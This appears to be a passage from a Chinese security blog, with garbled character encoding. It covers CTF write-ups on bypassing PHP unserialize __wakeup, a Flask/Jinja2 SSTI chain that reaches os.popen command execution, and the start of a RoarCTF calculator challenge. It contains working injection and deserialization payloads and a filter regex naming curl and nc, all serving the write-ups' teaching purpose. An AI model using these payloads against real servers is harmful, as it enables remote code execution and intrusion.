<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//test.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wake Up!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ABC</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="comment">//è¾“å‡ºä¸º</span></span><br><span class="line">	<span class="comment">//O:3:&quot;ABC&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ”¹ä¸€ä¸‹ä»£ç  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//test.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wake Up!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æŠŠåˆšæ‰çš„<code>O:3:"ABC":2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code>å¸¦å…¥å‚æ•°<code>str</code>ä¸­è¯·æ±‚</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062320038.png"
alt="image-20230406231932410" />
<figcaption aria-hidden="true">image-20230406231932410</figcaption>
</figure>
<p>ååºåˆ—åŒ–è§¦å‘äº†<code>__wakeup()</code>æ–¹æ³•,
ç»•è¿‡åªéœ€è¦å¯¹å±æ€§ä¸ªæ•°è¿›è¡Œä¿®æ”¹</p>
<p>ä¿®æ”¹å‰:<code>O:3:"ABC":2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code></p>
<p>ä¿®æ”¹å:<code>O:3:"ABC":3:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code></p>
<p>ä¹Ÿå°±æ˜¯ä»2ä¸ªå±æ€§æ”¹æˆ3ä¸ªå±æ€§.</p>
<blockquote>
<p>æ›´æ”¹å±æ€§æ•°é‡å¯¼è‡´ä¸å®é™…æ•°é‡ä¸ç¬¦ä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥,
ä½†æ˜¯<code>unserialize()</code>ä¼šå°†é‡åˆ°é”™è¯¯ä¹‹å‰èƒ½å¡«å……çš„å±æ€§éƒ½å¡«å……ä¸Š,
é‡åˆ°é”™è¯¯ä¹‹åå†æ‰§è¡Œ<code>__destruct()</code>å°†æ„é€ åˆ°ä¸€åŠçš„å¯¹è±¡ææ„,
å¹¶è¿”å›ä¸€ä¸ª<code>false</code>.
æ‰€ä»¥åœ¨<code>__destruct()</code>æ–¹æ³•é‡Œå¯ä»¥æ­£å¸¸è®¿é—®å·²ç»è¢«å¡«å……çš„å±æ€§.</p>
</blockquote>
<p>æ¥ä¸‹æ¥æ˜¯ä¸€é“CTFé¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è€ƒç‚¹å°±æ˜¯ç»•è¿‡<code>__wakeup()</code>, é¦–å…ˆç”Ÿæˆ<code>Payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;data.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è®¿é—®ä¸€ä¸‹, æŸ¥çœ‹<code>data.bin</code>æ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304070008126.png"
alt="image-20230407000850092" />
<figcaption aria-hidden="true">image-20230407000850092</figcaption>
</figure>
<p>ä»”ç»†çœ‹çš„è¯å¯ä»¥å‘ç°,
<code>*</code>çš„ä¸¤è¾¹éƒ½å„æœ‰ä¸€ä¸ª<code>\x00</code>å­—èŠ‚,
ä½†æ˜¯è¿™åœ¨æ–‡æœ¬ä¸Šæ˜¯æ˜¾ç¤ºä¸å‡ºæ¥çš„,
è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé‡‡ç”¨å†™å…¥æ–‡ä»¶å†æŸ¥çœ‹è¿™ç§éº»çƒ¦çš„æ–¹å¼è€Œä¸é‡‡ç”¨<code>echo</code>ç›´æ¥æµè§ˆå™¨æŸ¥çœ‹.</p>
<p>æ‰€ä»¥æ„é€ <code>Payload</code>çš„æ—¶å€™è¦é‡‡ç”¨<code>%00</code>æŠŠ<code>\x00</code>å­—èŠ‚è¡¥ä¸Šå».</p>
<p>æ‰€ä»¥<code>Payload</code>å°±æ˜¯:
<code>O:3:"ctf":3:&#123;s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:2:"ls";&#125;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304070019586.png"
alt="image-20230407001903508" />
<figcaption aria-hidden="true">image-20230407001903508</figcaption>
</figure>
<p>å› ä¸º<code>cat</code>è¢«è¿‡æ»¤äº†, æ‰€ä»¥ç”¨<code>tac</code>å°±å¯ä»¥äº†</p>
<p>æœ€ç»ˆ<code>Payload</code>:
<code>O:3:"ctf":3:&#123;s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:12:"tac flag.php";&#125;</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Python SSTI</title>
    <url>/2023/04/08/%5BWeb%5DPython%20SSTI/</url>
    <content><![CDATA[<h2 id="pythonä¸­çš„ç‰¹æ®Šå±æ€§æ–¹æ³•å‡½æ•°">Pythonä¸­çš„ç‰¹æ®Šå±æ€§/æ–¹æ³•/å‡½æ•°</h2>
<p>åœ¨<code>SSTI</code>ä¸­,
å¾€å¾€é€šè¿‡<code>å¯»æ‰¾åŸºç±»-&gt;æŸ¥æ‰¾å­ç±»-&gt;æ‰§è¡Œå±é™©å‡½æ•°</code>æ¥å®Œæˆæ”»å‡»,
éœ€è¦äº†è§£ä¸€äº›<code>Python</code>ç±»çš„ç‰¹æ®Šå±æ€§/æ–¹æ³•/å‡½æ•°.</p>
<ul>
<li><p><code>__class__</code>: å¯¹è±¡çš„å±æ€§, è¿”å›å¯¹è±¡æ‰€å±çš„ç±».</p></li>
<li><p><code>__mro__</code>: ç±»çš„å±æ€§,
è¿”å›ä¸€ä¸ªå«æœ‰æ‰€æœ‰çˆ¶ç±»(åŒ…æ‹¬é—´æ¥çˆ¶ç±»å’Œæœ¬ç±»)çš„å…ƒç»„.</p></li>
<li><p><code>__base__</code>: ç±»çš„å±æ€§, è¿”å›ç±»çš„ç›´æ¥çˆ¶ç±».</p></li>
<li><p><code>__bases__</code>: ç±»çš„å±æ€§, è¿”å›ç±»çš„æ‰€æœ‰ç›´æ¥çˆ¶ç±».
è·Ÿ<code>__base__</code>çš„åŒºåˆ«åœ¨äº, å¦‚æœå­ç±»æ˜¯å¤šç»§æ‰¿,
<code>__base__</code>åªä¼šè¿”å›ä¸€ä¸ª, è€Œ<code>__bases__</code>è¿”å›æ‰€æœ‰.
<code>__base__</code>ç›¸å½“äº<code>__bases__[0]</code>.</p></li>
<li><p><code>__globals__</code>: å‡½æ•°çš„å±æ€§,
ç”¨äºè·å–æŸä¸ªå‡½æ•°æ‰€åœ¨å¤„ä½ç½®çš„å…¨å±€å‘½åç©ºé—´çš„å˜é‡, å½“å‡½æ•°ä½äºå¦ä¸€ä¸ªæ¨¡å—æ—¶,
å¯ä»¥è·å–å¦ä¸€ä¸ªæ¨¡å—çš„å…¨å±€å‘½åç©ºé—´çš„å˜é‡.</p></li>
<li><p><code>__subclassess__()</code>: ç±»çš„æ–¹æ³•,
è¿”å›ç±»çš„ç›´æ¥å­ç±».</p></li>
<li><p><code>__dict__</code>: å¯¹è±¡çš„å±æ€§, ä¸€ä¸ªå­—å…¸,
å‚¨å­˜å¯¹è±¡çš„æ‰€æœ‰å±æ€§.</p></li>
<li><p><code>__init__()</code>: ç±»çš„æ–¹æ³•, ç”¨äºåˆå§‹åŒ–å¯¹è±¡.
åœ¨<code>SSTI</code>ä¸­ç”¨å®ƒä½œä¸ºè·³æ¿æ‹¿åˆ°<code>__globals__</code>å±æ€§.
å¦‚æœå£°æ˜ç±»æ—¶æœªé‡è½½<code>__init__()</code>,
æ­¤æ—¶çš„<code>__init__</code>æ²¡æœ‰<code>__globals__</code>å±æ€§.</p>
<blockquote>
<p>æœªé‡è½½çš„<code>__init__</code>:
<code>&lt;slot wrapper '__init__' of 'object' objects&gt;</code></p>
<p>é‡è½½è¿‡çš„<code>__init__</code>:
<code>&lt;function A.__init__ at 0x00000257D3B0D1F0&gt;</code></p>
</blockquote></li>
<li><p><code>__import__</code>:
è¿™ä¸ªå‡½æ•°åœ¨<code>built-in</code>å‘½åç©ºé—´é‡Œ,
æ•ˆæœç­‰åŒäº<code>import</code>è¯­å¥, è¿”å›å€¼æ˜¯ä¸€ä¸ªæ¨¡å—å¯¹è±¡.</p></li>
</ul>
<h2 id="flaskçš„ssti">Flaskçš„SSTI</h2>
<p><code>Flask</code>æ˜¯ä¸€ä¸ªæµè¡Œçš„è½»é‡çº§Webæ¡†æ¶,
åŸºäº<code>Python</code>.</p>
<h3 id="åŸºæœ¬ä½¿ç”¨">åŸºæœ¬ä½¿ç”¨</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)     </span><span class="comment">#è®¾å®šè·¯ç”±/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span>   <span class="comment">#å‡½æ•°çš„è¿”å›å€¼ä½œä¸ºç½‘é¡µä¼ é€’ç»™æµè§ˆå™¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()       <span class="comment">#é»˜è®¤ç›‘å¬127.0.0.1:5000</span></span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨æ¨¡æ¿">ä½¿ç”¨æ¨¡æ¿</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tpl = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;h1&gt;Hello &#123;&#123; request.args.get(&quot;name&quot;) &#125;&#125;!&lt;h1/&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨request, session, config, gå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)     </span><span class="comment">#è®¾å®šè·¯ç”±/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tpl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)       <span class="comment">#é»˜è®¤ç›‘å¬127.0.0.1:5000</span></span><br></pre></td></tr></table></figure>
<p>æäº¤ä¸€ä¸ª<code>name</code>å‚æ•°å°±å¯ä»¥çœ‹åˆ°å›æ˜¾äº†, ä½†æ˜¯è¿™ä¸ªæ²¡æ³•æ³¨å…¥,
è¡¨è¾¾å¼å·²ç»æ‰§è¡Œè¿‡äº†.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091445034.png"
alt="image-20230409144519964" />
<figcaption aria-hidden="true">image-20230409144519964</figcaption>
</figure>
<p>è¿™æ ·å°±å¯ä»¥æ³¨å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tpl = <span class="string">&quot;&lt;h1&gt;Hello &#123;0&#125;!&lt;h1/&gt;&quot;</span></span><br><span class="line"><span class="comment">#æ¨¡æ¿ä¸­å¯ä»¥ä½¿ç”¨çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment">#request, session, config, g, url_for</span></span><br><span class="line"><span class="comment">#namespace, lipsum, range, dict, self</span></span><br><span class="line"><span class="comment">#get_flashed_messages, cycler, joiner</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)     </span><span class="comment">#è®¾å®šè·¯ç”±/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tpl.<span class="built_in">format</span>(request.args.get(<span class="string">&quot;name&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)       <span class="comment">#é»˜è®¤ç›‘å¬127.0.0.1:5000</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091504254.png"
alt="image-20230409150416232" />
<figcaption aria-hidden="true">image-20230409150416232</figcaption>
</figure>
<p>è¡¨è¾¾å¼èƒ½è¢«æ‰§è¡Œå³å¯æ³¨å…¥.</p>
<h3 id="æ³¨å…¥æµ‹è¯•">æ³¨å…¥æµ‹è¯•</h3>
<p>å°±ç”¨ä¸Šé¢çš„ä»£ç ä½œä¸ºæœåŠ¡ç«¯.</p>
<h4 id="æ‰¾åŸºç±»object">æ‰¾åŸºç±»<code>object</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]        <span class="comment">#æŠŠç©ºå­—ç¬¦ä¸²æ¢æˆç©ºå­—å…¸å’Œç©ºåˆ—è¡¨ä¹Ÿè¡Œ, ä¸‹åŒ</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">request.__class__.__base__.__base__.__base__</span><br><span class="line">request.__class__.__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#requestå¯ä»¥æ¢æˆsession, config, gç­‰, ä½†æ˜¯ç±»ç»§æ‰¿çš„å±‚çº§ä¸ä¸€æ ·</span></span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯åˆ©ç”¨<code>__base__</code>å’Œ<code>__mro__</code>è¿™æ ·çš„å±æ€§æ‰¾åˆ°åŸºç±».</p>
<h4
id="æ‰¾é‡è½½è¿‡__init__æ–¹æ³•çš„å­ç±»">æ‰¾é‡è½½è¿‡<code>__init__()</code>æ–¹æ³•çš„å­ç±»</h4>
<p>ç”¨<code>BurpSuite</code>æ‰«ä¸€ä¸‹<code>__subclasses__()</code>è¿”å›çš„æ‰€æœ‰ç±»,
æ ¹æ®å›æ˜¾åˆ¤æ–­<code>__init__()</code>æ˜¯å¦è¢«é‡è½½è¿‡,
ä¹Ÿå¯ä»¥æ ¹æ®åå­—é€‰æ‹©å·²çŸ¥çš„æŸäº›ç‰¹æ®Šçš„ç±»,
æ¯”å¦‚<code>warnings.catch_warnings</code>,
è¿™ä¸ªç±»ä¸­å«æœ‰<code>os</code>æ¨¡å—æ— éœ€å¯¼å…¥.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091546713.png"
alt="image-20230409154648676" />
<figcaption aria-hidden="true">image-20230409154648676</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091548073.png"
alt="image-20230409154838014" />
<figcaption aria-hidden="true">image-20230409154838014</figcaption>
</figure>
<p>æ¯”å¦‚è¿™ä¸ªç´¢å¼•ä¸º106çš„ç±»å°±é‡è½½äº†<code>__init__()</code>,
æ¥ç€è®¿é—®å‡½æ•°çš„<code>__globals__</code>å±æ€§,
é€šè¿‡<code>keys()</code>æŸ¥çœ‹æœ‰å“ªäº›å˜é‡ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">106</span>].__init__.__globals__.keys()</span><br></pre></td></tr></table></figure></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091556501.png"
alt="image-20230409155635438" />
<figcaption aria-hidden="true">image-20230409155635438</figcaption>
</figure>
<p>å¯ä»¥çœ‹åˆ°, æœ‰<code>__builtins__</code>,
äºæ˜¯å¯ä»¥é€šè¿‡<code>__builtins__</code>é‡Œçš„<code>__import__()</code>åŠ è½½æƒ³è¦çš„æ¨¡å—,
æ¯”å¦‚<code>os</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">106</span>].__init__.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;dir&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091559865.png"
alt="image-20230409155959824" />
<figcaption aria-hidden="true">image-20230409155959824</figcaption>
</figure>
<p>ä¹Ÿå¯ä»¥ç”¨<code>__builtins__</code>é‡Œçš„<code>eval()</code>ç­‰å‡½æ•°å®ç°<code>RCE</code>æˆ–è€…æ–‡ä»¶è¯»å–å†™å…¥ç­‰åŠŸèƒ½.</p>
<h3 id="jinja2çš„ç‰¹æ€§">Jinja2çš„ç‰¹æ€§</h3>
<p>åœ¨<code>template</code>ä¸­ä½¿ç”¨å˜é‡æ—¶,
å¯ä»¥ç”¨<code>[]</code>å–ä»£<code>.</code>çš„åŠŸèƒ½,
åŒç†ä¹Ÿå¯ä»¥ç”¨<code>.</code>å–ä»£<code>[]</code>çš„åŠŸèƒ½.
å¯ä»¥ç”¨è¿™ä¸ªæ¥ç»•è¿‡<code>.</code>æˆ–è€…<code>[]</code>çš„<code>WAF</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#123;&#123; foo[<span class="string">&#x27;bar&#x27;</span>] &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸¤è¡Œä»£ç å¯ä»¥å®ç°ç›¸åŒçš„åŠŸèƒ½, ä½†æœ‰ä¸€äº›ç»†å¾®çš„åŒºåˆ«</p>
<p><code>foo.bar</code>:</p>
<ul>
<li>é¦–å…ˆæ‰§è¡Œ<code>getattr(foo, 'bar')</code></li>
<li>å¦‚æœæ²¡æ‰¾åˆ°, å†æ‰§è¡Œ<code>foo.__getitem__('bar')</code></li>
<li>éƒ½æ²¡æ‰¾åˆ°, è¿”å›ä¸€ä¸ªæœªå®šä¹‰çš„å¯¹è±¡</li>
</ul>
<p><code>foo['bar'</code>]:</p>
<ul>
<li>é¦–å…ˆæ‰§è¡Œ<code>foo.__getitem__('bar')</code></li>
<li>å¦‚æœæ²¡æ‰¾åˆ°, å†æ‰§è¡Œ<code>getattr(foo, 'bar')</code></li>
<li>éƒ½æ²¡æ‰¾åˆ°, è¿”å›ä¸€ä¸ªæœªå®šä¹‰çš„å¯¹è±¡</li>
</ul>
<blockquote>
<p>æœªå®Œå¾…ç»­</p>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SSTI</tag>
        <tag>flask</tag>
        <tag>jinja2</tag>
        <tag>ternado</tag>
      </tags>
  </entry>
  <entry>
    <title>[RoarCTF 2019]Easy Calc 1</title>
    <url>/2021/11/01/%5BWeb%5DRoarCTF-2019-Easy-Calc-1/</url>
    <content><![CDATA[<p>è¿›æ¥å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„è®¡ç®—å™¨, è¾“å…¥è¡¨è¾¾å¼ç»™å‡ºç»“æœ,å…ˆçœ‹ä¸€æ³¢æºä»£ç </p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011924048.png"
alt="image-20211101192427994" />
<figcaption aria-hidden="true">image-20211101192427994</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011925244.png"
alt="image-20211101192502182" />
<figcaption aria-hidden="true">image-20211101192502182</figcaption>
</figure>
<p>è¢«è®¾äº†WAF, å’±ä¹Ÿä¸çŸ¥é“æ˜¯é˜²çš„å•¥, æ¥ç€çœ‹.
è¯·æ±‚å‚æ•°è¢«å‘å¾€<code>calc.php</code>, æˆ‘ä»¬ç›´æ¥è®¿é—®ä¸€ä¸‹çœ‹çœ‹:</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011926659.png"
alt="image-20211101192659620" />
<figcaption aria-hidden="true">image-20211101192659620</figcaption>
</figure>
<p>æºç ç›´æ¥æ˜¾ç¤ºå‡ºæ¥äº†, å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šè¿‡æ»¤, å¾ˆå¤šå­—ç¬¦éƒ½è¢«åˆ—å…¥äº†é»‘åå•.
å…ˆçœ‹çœ‹èƒ½ä¸èƒ½å¾—åˆ°å½“å‰çš„æ–‡ä»¶ç»å¯¹è·¯å¾„</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011938789.png"
alt="image-20211101193809717" />
<figcaption aria-hidden="true">image-20211101193809717</figcaption>
</figure>
<p>ç½‘é¡µç›´æ¥<code>Forbidden</code>äº†, ç»è¿‡æµ‹è¯•,
åªè¦<code>num</code>çš„å‚æ•°é‡Œå«é™¤æ•°å­—ä»¥å¤–çš„å­—ç¬¦å°±ä¼šå¦‚æ­¤,
è¿™åº”è¯¥å°±æ˜¯ä¹‹å‰è¯´çš„WAFäº†, ä¸ç»•è¿‡è¿™ä¸ªWAFåé¢çš„æ“ä½œéƒ½æ— æ³•è¿›è¡Œä¸‹å».
ä½†æ˜¯è¦ç»•è¿‡è¿™ä¸ªæ¼æ´,
é¦–å…ˆè¦çŸ¥é“phpåœ¨è§£ææäº¤çš„å‚æ•°åå’Œå…¶å¯¹åº”çš„å€¼æ—¶éƒ½åšäº†ä»€ä¹ˆ</p>
<blockquote>
<p>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°åè½¬æ¢ä¸ºæœ‰æ•ˆé”®å(æ¯”å¦‚åœ¨$_REQUESTå˜é‡é‡Œçš„å…³è”æ•°ç»„é‡Œ,
æœ‰æ‰€æœ‰æäº¤çš„å‚æ•°åå’Œå€¼)</p>
<p>æ‰€ä»¥<code>php</code>è‡³å°‘ä¼šå¹²ä¸¤ä»¶äº‹</p>
<p>1.åˆ é™¤æŸäº›å­—ç¬¦</p>
<p>2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿<code>_</code></p>
</blockquote>
<p>ä»¥ä¸‹ä¸ºä¸€äº›æœ¬åœ°æµ‹è¯•ç»“æœ:</p>
<blockquote>
<ol type="1">
<li>ä½äºæäº¤çš„å‚æ•°å‰é¢çš„<code>[ç©ºæ ¼]</code>ã€<code>%20</code>æˆ–<code>+</code>ä¼šè¢«åˆ é™¤,
æ¯”å¦‚æäº¤<code>param=1&amp;  param2=2(æˆ–param=1&amp;++param2=2)</code> ,
æœ€ç»ˆåœ¨<code>$_REQUEST</code>é‡Œæ˜¯<code>("param1"=&gt;"1","param2"=&gt;"2")</code></li>
